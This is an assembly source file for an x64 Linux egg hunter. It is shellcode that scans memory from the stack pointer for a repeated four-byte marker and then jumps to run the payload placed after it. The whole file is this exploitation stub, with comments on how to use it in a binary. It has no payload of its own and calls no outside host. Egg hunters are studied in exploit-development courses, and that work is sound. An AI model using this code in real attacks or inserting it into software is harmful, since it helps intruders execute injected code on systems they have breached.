; File: egghunter_no_memcheck.nasm
; Author: Petr Javorik
; Size:
; Platform: Linux x64
; Description: x64 Linux egg hunter without memory checking

global _start

section .text

_start:

    ; suppose we know our payload is located somewhere in stack
    ; so let crawler start from RSP
    mov rax, rsp

    ; define egg
    ; note that egg must contain valid opcodes because
    ; it will get executed before payload
    mov edx, 0x464e464e     ; inc esi, dec esi, inc esi, dec esi

search_first_egg:

    inc rax                 ; step to next byte
    cmp dword [rax], edx    ; compare 4 lower bytes in rax and egg in edx
    jne search_first_egg    ; repeat loop if not match

search_second_egg:

    ; CAUTION
    ; Egg will be contained in .data section of binary which
    ; will be created using this egg hunter shellcode
    ; If you are crawling even .data section you must count with that.
    ; Prepend the payload shellcode twice and let the egg hunter find
    ; two consecutive eggs.

    cmp dword [rax +4], edx
    jne search_first_egg

egg_found:

    ; load eip with rax, execute egg, execute payload
    jmp rax
